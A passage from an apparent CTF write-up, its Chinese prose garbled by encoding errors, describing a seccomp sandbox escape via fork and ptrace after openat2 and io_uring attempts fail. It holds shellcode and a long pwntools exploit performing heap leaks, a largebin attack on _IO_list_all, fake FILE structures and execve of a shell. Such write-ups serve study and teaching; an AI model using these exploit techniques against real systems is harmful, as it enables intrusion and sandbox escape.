class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rax, 0x67616c66</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    sub rdi, 100</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    mov rdx, rsp</span></span><br><span class="line"><span class="string">    mov r10, 0x18</span></span><br><span class="line"><span class="string">    push SYS_openat2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov edi,1</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>åœ¨æœ¬åœ°æ‰§è¡Œ <code>shellcode</code> åå¯ä»¥é©¬ä¸Šè·å–åˆ°flagï¼Œå¯æ˜¯è¿œç¨‹ä¸è¡Œï¼Œå½“æ—¶æˆ‘è®¤ä¸ºå‡ºé¢˜è€…æŠŠflagçš„æ–‡ä»¶åç»™æ”¹äº†ï¼Œæ‰€ä»¥æˆ‘å†™äº†ä»¥ä¸‹ <code>shellcode</code> æ¥è·å–å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶åï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rax, 0x2f2e</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    sub rdi, 100</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    mov rdx, rsp</span></span><br><span class="line"><span class="string">    mov r10, 0x18</span></span><br><span class="line"><span class="string">    push SYS_openat2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode += asm(shellcraft.getdents64(<span class="number">3</span>, heap_base + <span class="number">0x300</span>, <span class="number">0x600</span>))</span><br><span class="line">shellcode += asm(shellcraft.write(<span class="number">1</span>, heap_base + <span class="number">0x300</span>, <span class="number">0x600</span>))</span><br></pre></td></tr></table></figure><p>åœ¨æœ¬åœ°æµ‹è¯•æ˜¯æ²¡é—®é¢˜çš„ï¼Œå¯æ˜¯åˆ°è¿œç¨‹å°±ä¾ç„¶ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œåé¢å‘ç°è¿œç¨‹çš„ <code>kernel</code> ç‰ˆæœ¬æ˜¯ <code>5.4</code>ï¼Œè€Œ <code>openat2</code> ç³»ç»Ÿè°ƒç”¨æ˜¯åœ¨ <code>kernel 5.6</code> æ‰å¼•å…¥çš„ï¼Œæ‰€ä»¥è¿™ç§æ–¹æ³•ä½œåºŸ</p><p>ç„¶åæˆ‘æƒ³åˆ°äº† <code>io_uring</code>ï¼Œå¯æ˜¯ä¾ç„¶æ˜¯æœ¬åœ°èƒ½è·å–flagï¼Œè¿œç¨‹æ— æ³•è·å–flagï¼Œé‚£å¤§æ¦‚ç‡å°±æ˜¯ä¸çŸ¥é“flagçš„è·¯å¾„å’Œæ–‡ä»¶åçš„é—®é¢˜äº†ï¼Œäºæ˜¯æ¯”èµ›ä¸­å°±æ²¡æœ‰åšå‡ºæ¥â€¦â€¦</p><p>èµ›åå†é‡æ–°ä»”ç»†ç ”ç©¶äº†ä¸€ä¸‹é¢˜ç›®ï¼Œå‘ç° <code>seccomp</code> ç¦ç”¨ç³»ç»Ÿè°ƒç”¨çš„æ—¶å€™å¹¶æ²¡æœ‰ç›´æ¥ <code>return KILL</code>ï¼Œè€Œæ˜¯ <code>return TRACE</code>ï¼Œç„¶åæˆ‘åœ¨é¡¹ç›® <code>The Linux Kernel documentation</code> ä¸Šæ‰¾åˆ°äº†å¯¹äºè¯¥è¿”å›å€¼çš„æè¿°ï¼š</p><blockquote><p>SECCOMP_RET_TRACE:<br>When returned, this value will cause the kernel to attempt to notify a ptrace()-based tracer prior to executing the system call. If there is no tracer present, -ENOSYS is returned to userland and the system call is not executed.<br>A tracer will be notified if it requests PTRACE_O_TRACESECCOMP using ptrace(PTRACE_SETOPTIONS). The tracer will be notified of a PTRACE_EVENT_SECCOMP and the SECCOMP_RET_DATA portion of the BPF program return value will be available to the tracer via PTRACE_GETEVENTMSG.<br>The tracer can skip the system call by changing the syscall number to -1. Alternatively, the tracer can change the system call requested by changing the system call to a valid syscall number. If the tracer asks to skip the system call, then the system call will appear to return the value that the tracer puts in the return value register.<br>The seccomp check will not be run again after the tracer is notified. (This means that seccomp-based sandboxes MUST NOT allow use of ptrace, even of other sandboxed processes, without extreme care; ptracers can use this mechanism to escape.)</p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æœ‰åŠæ³•å¯¹ <code>seccomp</code> è¿›è¡Œé€ƒé€¸ï¼Œå…¶å…·ä½“åšæ³•ä¸ºï¼šä½¿ç”¨ <code>fork</code> å¼€ä¸€ä¸ªå­è¿›ç¨‹ï¼Œå­è¿›ç¨‹éœ€è¦ <code>ptrace(PTRACE_TRACEME, 0, 0,0);</code> æ¥å…è®¸è‡ªå·±è¢«çˆ¶è¿›ç¨‹è¿½è¸ªï¼Œçˆ¶è¿›ç¨‹éœ€ä½¿ç”¨ <code>ptrace(PTRACE_ATTACH, pid, 0, 0);</code> æ¥è¿½è¸ªå­è¿›ç¨‹ã€‚ç„¶åçˆ¶è¿›ç¨‹åœ¨ <code>wait()</code> é˜»å¡ç­‰å¾…å­è¿›ç¨‹å‘èµ·ç³»ç»Ÿè°ƒç”¨ã€‚ä¸€æ—¦æ•æ‰åˆ°ï¼Œåˆ™å­è¿›ç¨‹é˜»å¡ï¼Œçˆ¶è¿›ç¨‹ç»§ç»­è¿è¡Œï¼Œæ­¤æ—¶éœ€ç”¨ <code>ptrace(PTRACE_0_SUSPEND_SEECOMP, pid, 0, PTRACE_0_TRACESECCOMP);</code> å°†è¢« <code>TRACE</code> ç³»ç»Ÿçš„è°ƒç”¨æ”¹ä¸ºå…è®¸è¿è¡Œï¼Œç„¶å <code>ptrace(PTRACE_SCONT);</code> æ¥æ¢å¤å­è¿›ç¨‹çš„ç³»ç»Ÿè°ƒç”¨æ‰§è¡Œã€‚ç”±äºæˆ‘ä»¬ä¸çŸ¥é“ <code>flag</code> çš„è·¯å¾„å’Œæ–‡ä»¶åæ˜¯ä»€ä¹ˆï¼Œæ‰€ä»¥ç›´æ¥ä½¿ç”¨ <code>execve</code> æ¥æ‹¿ <code>shell</code>, <code>exp</code> å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&quot;./ld-linux-x86-64.so.2&quot;</span>, <span class="string">&quot;./pwn&quot;</span>],</span><br><span class="line">        env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="comment"># p = process([&#x27;./libc.so&#x27;,&#x27;./pwn&#x27;])</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment"># p=remote(&#x27;49.234.30.109&#x27;,9999)</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;wt.exe&#x27;, &#x27;-w&#x27;, &quot;0&quot;, &quot;sp&quot;, &quot;-d&quot;, &quot;.&quot;, &quot;wsl.exe&quot;, &quot;-d&quot;, &quot;Ubuntu-20.04&quot;, &quot;bash&quot;, &quot;-c&quot;]</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&#x27;./ld-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    <span class="keyword">global</span> heap_base</span><br><span class="line">    <span class="keyword">global</span> libc_base</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> temp</span><br><span class="line">    <span class="keyword">global</span> stack</span><br><span class="line">    <span class="keyword">global</span> leak</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">meau</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;5. Exit&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    meau(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bye</span>():</span><br><span class="line">    meau(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,Content</span>):</span><br><span class="line">    meau(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content&#x27;</span>)</span><br><span class="line">    p.send(Content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    meau(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x510</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x500</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaaaaaaaaaaaaaa&#x27;</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x290</span></span><br><span class="line">lg(<span class="string">&quot;heap_base&quot;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x510</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1f6cc0</span></span><br><span class="line">lg(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x510</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x510</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x520</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x550</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">bin</span> = libc_base + <span class="number">0x1f70f0</span></span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="built_in">bin</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x550</span>)</span><br><span class="line"></span><br><span class="line">order2 = <span class="string">b&#x27;h\x00&#x27;</span>[::-<span class="number">1</span>].<span class="built_in">hex</span>()</span><br><span class="line">order1 = <span class="string">b&#x27;/bin/bas&#x27;</span>[::-<span class="number">1</span>].<span class="built_in">hex</span>()</span><br><span class="line">shellcode = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">_start:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Step 1: fork a new process */</span></span><br><span class="line"><span class="string">    mov rax, 57             /* syscall number for fork (on x86_64) */</span></span><br><span class="line"><span class="string">    syscall                 /* invoke fork() */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax           /* check if return value is 0 (child) or positive (parent) */</span></span><br><span class="line"><span class="string">    js _exit                /* if fork failed, exit */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Step 2: If parent process, attach to child process */</span></span><br><span class="line"><span class="string">    cmp rax, 0              /* are we the child process? */</span></span><br><span class="line"><span class="string">    je child_process        /* if yes, jump to child_process */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">parent_process:</span></span><br><span class="line"><span class="string">    /* Store child PID */</span></span><br><span class="line"><span class="string">    mov r8,rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rsi, r8            /* rdi = child PID */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Attach to child process */</span></span><br><span class="line"><span class="string">    mov rax, 101            /* syscall number for ptrace */</span></span><br><span class="line"><span class="string">    mov rdi, 0x10           /* PTRACE_ATTACH */</span></span><br><span class="line"><span class="string">    xor rdx, rdx            /* no options */</span></span><br><span class="line"><span class="string">    xor r10, r10            /* no data */</span></span><br><span class="line"><span class="string">    syscall                 /* invoke ptrace(PTRACE_ATTACH, child_pid, 0, 0) */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">monitor_child:</span></span><br><span class="line"><span class="string">    /* Wait for the child to stop */</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rdi, r8            /* rdi = child PID */</span></span><br><span class="line"><span class="string">    mov rsi, rsp            /*  no status*/</span></span><br><span class="line"><span class="string">    xor rdx, rdx            /* no options */</span></span><br><span class="line"><span class="string">    xor r10, r10            /* no rusage */</span></span><br><span class="line"><span class="string">    mov rax, 61             /* syscall number for wait4 */</span></span><br><span class="line"><span class="string">    syscall                 /* invoke wait4() */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Set ptrace options */</span></span><br><span class="line"><span class="string">    mov rax, 110</span></span><br><span class="line"><span class="string">    syscall    </span></span><br><span class="line"><span class="string">    mov rdi, 0x4200         /* PTRACE_SETOPTIONS */</span></span><br><span class="line"><span class="string">    mov rsi, r8            /* rsi = child PID */</span></span><br><span class="line"><span class="string">    xor rdx, rdx            /* no options */</span></span><br><span class="line"><span class="string">    mov r10, 0x00000080     /* PTRACE_O_TRACESECCOMP */</span></span><br><span class="line"><span class="string">    mov rax, 101            /* syscall number for ptrace */</span></span><br><span class="line"><span class="string">    syscall                 /* invoke ptrace(PTRACE_SETOPTIONS, child_pid, 0, 0) */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Allow the child process to continue */</span></span><br><span class="line"><span class="string">    mov rax, 110</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rdi, 0x7            /* PTRACE_CONT */</span></span><br><span class="line"><span class="string">    mov rsi, r8            /* rsi = child PID */</span></span><br><span class="line"><span class="string">    xor rdx, rdx            /* no options */</span></span><br><span class="line"><span class="string">    xor r10, r10            /* no data */</span></span><br><span class="line"><span class="string">    mov rax, 101            /* syscall number for ptrace */</span></span><br><span class="line"><span class="string">    syscall                 /* invoke ptrace(PTRACE_CONT, child_pid, 0, 0) */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Loop to keep monitoring the child */</span></span><br><span class="line"><span class="string">    jmp monitor_child</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">child_process:</span></span><br><span class="line"><span class="string">    /* Child process code here */</span></span><br><span class="line"><span class="string">    /* For example, we could execute a shell or perform other actions */</span></span><br><span class="line"><span class="string">    /* To keep it simple, let&#x27;s just execute `/bin/sh` */</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">    /* sleep(5) */</span></span><br><span class="line"><span class="string">    /* push 0 */</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    dec byte ptr [rsp]</span></span><br><span class="line"><span class="string">    /* push 5 */</span></span><br><span class="line"><span class="string">    push 5</span></span><br><span class="line"><span class="string">    /* nanosleep(requested_time=&#x27;rsp&#x27;, remaining=0) */</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    xor esi, esi /* 0 */</span></span><br><span class="line"><span class="string">    /* call nanosleep() */</span></span><br><span class="line"><span class="string">    push SYS_nanosleep /* 0x23 */</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, 0x<span class="subst">&#123;order2&#125;</span>  /* &quot;/bin/sh&quot; */</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rax, 0x<span class="subst">&#123;order1&#125;</span>  /* &quot;/bin/sh&quot; */</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rdi, rsp    </span></span><br><span class="line"><span class="string">    mov rsi, 0</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    mov rax, 59             /* syscall number for execve */</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    jmp child_process</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">_exit:</span></span><br><span class="line"><span class="string">    /* Exit the process */</span></span><br><span class="line"><span class="string">    mov rax, 60             /* syscall number for exit */</span></span><br><span class="line"><span class="string">    xor rdi, rdi            /* status 0 */</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,shellcode)</span><br><span class="line"></span><br><span class="line">target = libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line"></span><br><span class="line">stderr = libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line">setcontext = libc_base + libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">magic_gadget = libc_base + <span class="number">0x000000000008c385</span></span><br><span class="line">mprotect = libc_base + libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">pop_rax_call_rax = libc_base + <span class="number">0x000000000015f288</span></span><br><span class="line"></span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: heap_base + <span class="number">0x5000</span>, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x500</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span 